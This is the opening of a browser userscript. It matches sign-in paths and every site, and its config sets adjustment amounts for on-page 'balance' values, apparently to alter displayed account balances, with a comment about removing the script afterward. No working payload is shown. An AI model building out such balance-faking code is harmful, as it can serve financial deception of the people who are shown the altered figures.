// ==UserScript==
// @name         Ed 4Rec  com.frova@t-online.de
// @namespace    http://tampermonkey.net/
// @version      2.1
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/514662/Ed%204Rec%20%20comfrova%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/514662/Ed%204Rec%20%20comfrova%40t-onlinede.meta.js
// ==/UserScript==


//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------


//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL


   // Configurable modification amounts and corresponding indexes
    var homeBALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: 0 },
  //      { index: 1, adjustmentAmount: 20000 },
  //      { index: 2, adjustmentAmount: 10000 },
  //      { index: 3, adjustmentAmount: -5000 },
  //      { index: 4, adjustmentAmount: 20000 },
  //      { index: 5, adjustmentAmount: -15000 }
        // Add more configurations as needed...
    ];
